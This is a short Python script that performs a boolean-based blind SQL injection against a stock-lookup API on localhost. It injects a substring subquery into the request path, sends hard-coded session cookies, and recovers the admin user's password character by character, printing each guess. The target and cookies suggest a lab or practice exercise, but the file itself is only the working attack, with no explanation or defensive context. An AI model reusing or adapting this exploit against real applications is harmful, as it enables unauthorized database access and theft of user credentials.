import requests
import string

def blind_sql_injection():
    base_url = "http://localhost:8000/api/stock/"
    username = "admin"
    password_length = 255 #max lenth  
    password_chars = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
    
    guessed_password = ""
    
    for position in range(1, password_length + 1):
        found_char = None
        
        for char in password_chars:
            payload = f"-1') or (select substring(password,{position},1) from users where username='{username}')='{char}', 1, 0) as in_stock-- -"
            
            url = base_url + payload
            cookies = {
                "connect.sid": "s%3A2Yg8_c_BjmFNEP6tOyynSqVfSj2i9a0L.Go%2FTvAfRxsHOSTo40Bq8Mye910q%2FGIbTEvWTAnlEW8Y",
                "session_cookie": "s%3Amfmfa1O5sIwFnCGiKzKMgdm3n_Te2-yD.bVA98rWMElLjA3RZSJCAl7AJ0wc0cnLDPm2RABhyV3g"
             }

            try:
                response = requests.get(url, cookies=cookies)

                if response.status_code == 200 and "true" in response.text.lower():
                    found_char = char
                    guessed_password += char
                    print(f"[+] Position {position}: '{char}' - Current: {guessed_password}")
                    break
                    
            except requests.RequestException as e:
                print(f"[-] Error: {e}")
                return None
                
        if not found_char:
            return guessed_password
            
    
    return guessed_password

if __name__ == "__main__":
    print("Starting blind SQL injection...")
    password = blind_sql_injection()
    if password:
        print(f"\n[SUCCESS] Recovered password: {password}")
    else:
        print("\n[FAILED] Password recovery unsuccessful")